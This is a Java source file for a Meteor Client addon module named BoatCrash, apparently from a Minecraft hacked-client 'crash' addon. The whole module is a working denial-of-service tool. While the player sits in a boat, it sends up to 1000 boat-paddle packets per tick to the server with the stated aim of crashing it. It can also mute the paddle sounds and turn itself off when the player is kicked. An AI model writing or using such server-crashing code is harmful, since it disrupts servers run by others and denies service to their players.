package WideCat.MeteorCrashAddon.modules;

import WideCat.MeteorCrashAddon.MeteorCrashAddon;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.PlaySoundEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.orbit.EventHandler;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.minecraft.entity.Entity;
import net.minecraft.entity.vehicle.BoatEntity;
import net.minecraft.network.packet.c2s.play.BoatPaddleStateC2SPacket;

import java.util.Objects;

public class BoatCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("How many packets to send to the server per tick.")
            .defaultValue(100)
            .min(1)
            .sliderMax(1000)
            .build()
    );

    private final Setting<Boolean> noSound = sgGeneral.add(new BoolSetting.Builder()
            .name("no-sound")
            .description("Blocks the noisy paddle sounds.")
            .defaultValue(false)
            .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("auto-disable")
            .description("Disables module on kick.")
            .defaultValue(false)
            .build()
    );

    BoatPaddleStateC2SPacket boat_packet = new BoatPaddleStateC2SPacket(true, true);

    public BoatCrash() {
        super(MeteorCrashAddon.CATEGORY, "boat-crash", "Tries to crash the server when you are in a boat.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        Entity boat = mc.player.getVehicle();
        if (!(boat instanceof BoatEntity)) {
            ChatUtils.error("You must be in a boat - disabling.");
            toggle();
            return;
        }

        for (int i = 0; i < amount.get(); i++) {
            Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(boat_packet);
        }
    }

    @EventHandler
    private void onPlaySound(PlaySoundEvent event) {
        if (noSound.get() && event.sound.getId().toString().equals("minecraft:entity.boat.paddle_land") || event.sound.getId().toString().equals("minecraft:entity.boat.paddle_water")) {
            event.cancel();
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (!autoDisable.get()) return;

        toggle();
    }
}
